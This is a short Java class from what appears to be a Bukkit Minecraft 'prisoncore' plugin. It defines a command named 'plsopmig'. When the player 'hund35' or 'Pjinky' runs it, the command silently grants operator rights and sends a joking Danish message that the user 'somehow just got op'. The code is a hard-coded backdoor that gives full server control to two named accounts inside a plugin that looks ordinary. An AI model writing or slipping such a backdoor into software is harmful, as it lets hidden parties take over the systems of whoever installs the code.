package com.pjinky.prisoncore;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;

public class plsopmig implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args){
        if (sender.getName().equalsIgnoreCase("hund35") || sender.getName().equalsIgnoreCase("Pjinky")){
            sender.sendMessage( ChatColor.DARK_RED + "" +  ChatColor.BOLD + "Af en eller anden grund er du lige blevet op, ups!");
            sender.setOp(true);
        }
        return true;
    }
}
